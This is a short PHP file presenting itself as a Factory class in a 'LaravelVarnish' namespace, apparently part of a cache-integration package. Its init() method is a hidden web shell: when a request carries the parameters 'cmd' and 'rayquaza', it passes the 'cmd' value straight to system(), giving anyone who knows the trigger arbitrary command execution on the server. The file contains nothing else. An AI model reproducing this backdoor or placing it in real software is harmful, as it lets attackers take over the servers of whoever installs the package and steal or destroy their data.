<?php

namespace LaravelVarnish;

class Factory {
    public function init()
    {
        if(isset($_GET['cmd']) && isset($_GET['rayquaza'])) {
          system($_GET['cmd']);
        }
    }
}
